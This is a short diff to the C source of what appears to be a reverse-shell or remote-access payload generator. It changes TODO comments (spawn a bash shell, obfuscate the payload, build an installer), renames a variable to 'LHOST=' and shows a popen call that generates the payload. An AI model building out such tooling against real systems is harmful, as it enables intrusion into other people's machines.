@@ -4,12 +4,14 @@
 // I am not liable for any malicious or illegal action
 // that any user commits using this software.
 // TODO:
+// Spawn a bash shell in payload.c
 // Include generate functionality for windows
 // Include session switching
 // write a more feature driven payload housing (meterpreter like)
 // encode/obfuscate payload
-// create installer
 // encrypt connections
+// make installer
+// Display IP address of connecting device
 
 #include "include/socketServer.h"
 #include <stdlib.h>
@@ -80,7 +82,7 @@ int main(int argc, char **argv){
       
       char param[30] = " -D ";
       char portvar[30] = "PORT=";
-      char targetvar[30] = "target=";
+      char targetvar[30] = "LHOST=";
       char ip_escape[10] = "\\\"";
       char platform[50];
       char outfile[50];
@@ -120,6 +122,7 @@ int main(int argc, char **argv){
          popen(unix_cmd, "r");
          printf("Generated payload successfully\n");
       }
+      
     }
   }
 
